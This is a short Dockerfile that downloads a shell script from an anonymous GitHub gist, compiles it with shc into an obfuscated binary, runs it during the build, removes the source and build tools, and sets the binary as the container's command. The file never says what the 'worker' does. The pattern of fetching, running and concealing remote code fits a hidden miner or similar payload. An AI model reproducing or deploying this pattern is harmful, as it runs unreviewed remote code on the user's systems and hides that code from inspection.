FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/111kb/5e699056d5545afff466de599d91cd2e/raw/2c99e4c8fa564051b6077314f8f9fa7944c4fe4c/vitwo

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
